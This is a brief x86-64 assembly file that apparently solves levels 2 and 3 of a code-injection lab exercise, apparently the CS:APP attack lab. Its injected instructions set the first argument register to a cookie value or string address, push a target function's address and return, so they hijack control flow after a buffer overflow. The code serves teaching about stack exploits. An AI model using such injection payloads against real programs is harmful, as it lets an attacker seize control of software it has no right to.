# Level 2 injection code
	movq $0x59b997fa, %rdi	# use cookie value as 1st parameter of touch2
	push $0x4017ec		# push touch2 address
	retq			# return to touch2
	
# Level 3 injection code
	movq $0x5561dca8, %rdi	# string start address
	push $0x4018fa		# push touch3 address
	retq			# return touch3
